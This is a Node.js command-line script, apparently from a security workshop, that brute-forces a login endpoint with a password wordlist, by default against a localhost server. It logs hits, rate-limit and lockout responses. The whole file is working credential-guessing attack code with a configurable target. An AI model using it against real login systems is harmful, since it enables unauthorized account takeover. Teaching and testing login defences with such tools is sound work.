#!/usr/bin/env node
/**
 * Workshop brute force attack script.
 *
 * Usage:
 *   node attacker/bruteforce.js [options]
 *
 * Options:
 *   --target <url>       Login endpoint (default: http://localhost:3001/login)
 *   --username <name>    Username to attack (default: bob)
 *   --wordlist <file>    Path to wordlist (default: ./attacker/wordlist.txt)
 *   --delay <ms>         Delay between requests in ms (default: 0)
 *   --stop-on-block      Stop when a 429 or 403 is received
 */
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const chalk = require("chalk");

// ── Parse CLI arguments ──────────────────────────────────────────────────────
const args = process.argv.slice(2);

function getArg(name, defaultValue) {
  const idx = args.indexOf(name);
  return idx !== -1 ? args[idx + 1] : defaultValue;
}

const TARGET   = getArg("--target",   "http://localhost:3001/login");
const USERNAME = getArg("--username", "bob");
const WORDLIST = getArg("--wordlist", path.join(__dirname, "wordlist.txt"));
const DELAY    = parseInt(getArg("--delay", "0"), 10);
const STOP_ON_BLOCK = args.includes("--stop-on-block");

// ── Load wordlist ────────────────────────────────────────────────────────────
if (!fs.existsSync(WORDLIST)) {
  console.error(chalk.red(`Wordlist not found: ${WORDLIST}`));
  process.exit(1);
}

const passwords = fs
  .readFileSync(WORDLIST, "utf8")
  .split("\n")
  .map((p) => p.trim())
  .filter(Boolean);

// ── Stats ────────────────────────────────────────────────────────────────────
let totalRequests = 0;
let blockedCount  = 0;
const startTime   = Date.now();

function printStats() {
  const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
  const rps = (totalRequests / Math.max(1, (Date.now() - startTime) / 1000)).toFixed(1);
  process.stdout.write(
    chalk.gray(`\n  Requests: ${totalRequests} | Blocked: ${blockedCount} | Elapsed: ${elapsed}s | RPS: ${rps}\n`)
  );
}

function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

// ── Attack loop ──────────────────────────────────────────────────────────────
async function attack() {
  console.log(chalk.bold("\n=== Workshop Brute Force Script ==="));
  console.log(chalk.cyan(`  Target:   ${TARGET}`));
  console.log(chalk.cyan(`  Username: ${USERNAME}`));
  console.log(chalk.cyan(`  Wordlist: ${passwords.length} passwords`));
  console.log(chalk.cyan(`  Delay:    ${DELAY}ms per request`));
  console.log(chalk.cyan(`  Stop on block: ${STOP_ON_BLOCK}`));
  console.log("");

  for (const password of passwords) {
    const reqStart = Date.now();
    totalRequests++;

    let status;
    let responseData;

    try {
      const response = await axios.post(
        TARGET,
        { username: USERNAME, password },
        { validateStatus: () => true, timeout: 10000 }
      );
      status = response.status;
      responseData = response.data;
    } catch (err) {
      console.log(chalk.red(`  [ERROR] ${err.message}`));
      continue;
    }

    const latency = Date.now() - reqStart;
    const latencyStr = chalk.gray(`(${latency}ms)`);

    if (status === 200) {
      console.log(chalk.green.bold(`  [HIT]  "${password}" → 200 OK ✓ PASSWORD FOUND! ${latencyStr}`));
      printStats();
      console.log(chalk.green.bold(`\n  Cracked! Username: ${USERNAME}  Password: ${password}\n`));
      return;
    } else if (status === 401) {
      console.log(chalk.red(`  [MISS] "${password}" → 401 Unauthorized ${latencyStr}`));
    } else if (status === 429) {
      blockedCount++;
      console.log(chalk.yellow(`  [RATE] "${password}" → 429 Too Many Requests ${latencyStr}`));
      if (STOP_ON_BLOCK) {
        printStats();
        console.log(chalk.yellow("\n  Stopped: rate limit hit (--stop-on-block).\n"));
        return;
      }
    } else if (status === 403) {
      blockedCount++;
      console.log(chalk.magenta(`  [LOCK] "${password}" → 403 Forbidden (account locked) ${latencyStr}`));
      if (STOP_ON_BLOCK) {
        printStats();
        console.log(chalk.magenta("\n  Stopped: account lockout hit (--stop-on-block).\n"));
        return;
      }
    } else {
      console.log(chalk.gray(`  [????] "${password}" → ${status} ${latencyStr}`));
    }

    if (DELAY > 0) await sleep(DELAY);
  }

  printStats();
  console.log(chalk.bold.red("\n  Wordlist exhausted. Password not found.\n"));
}

attack().catch((err) => {
  console.error(chalk.red("Fatal error:"), err.message);
  process.exit(1);
});
